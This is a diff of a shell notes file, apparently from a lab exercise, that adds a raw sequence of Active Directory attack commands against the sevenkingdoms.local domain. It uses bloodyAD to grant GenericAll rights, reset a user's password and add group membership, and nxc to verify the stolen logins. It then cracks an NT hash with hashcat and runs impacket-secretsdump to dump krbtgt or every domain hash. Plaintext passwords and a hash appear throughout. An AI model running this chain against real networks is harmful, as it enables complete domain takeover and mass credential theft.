@@ -490,3 +490,22 @@ DC=192.168.88.10
 P='powerkingftw135'
 
 bad(){ bloodyAD --host kingslanding.sevenkingdoms.local -d "$D" --dc-ip "$DC" "$@"; }
+
+
+[02.09.2026 18:17] Sh: joffrey->tyron
+
+
+bad -u joffrey.baratheon -p '1killerlion' add genericAll tyron.lannister joffrey.baratheon
+bad -u joffrey.baratheon -p '1killerlion' set password tyron.lannister 'NewPass123!'
+[02.09.2026 18:17] Sh: nxc smb "$DC" -u joffrey.baratheon -p '1killerlion'        # [+]
+bad -u joffrey.baratheon -p '1killerlion' set password tyron.lannister 'NewPass123!'
+nxc smb "$DC" -u tyron.lannister -p 'NewPass123!'          # [+]
+bad -u tyron.lannister -p 'NewPass123!' add groupMember DRAGONSTONE tyron.lannister
+[02.09.2026 18:17] Sh: echo 2f3659c7c8ea38bdd655a17dc81dddac > stannis.nt
+hashcat -m 1000 stannis.nt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 stannis.nt /usr/share/wordlists/rockyou.txt --show
+[02.09.2026 18:17] Sh: # только krbtgt (символ полного захвата)
+impacket-secretsdump 'sevenkingdoms.local/KINGSLANDING$'@192.168.1.10 -hashes :2f3659c7c8ea38bdd655a17dc81dddac -just-dc-user krbtgt
+
+# или выгрузить ВЕСЬ домен (krbtgt + Administrator + все хеши)
+impacket-secretsdump 'sevenkingdoms.local/KINGSLANDING$'@192.168.1.10 -hashes :2f3659c7c8ea38bdd655a17dc81dddac -just-dc
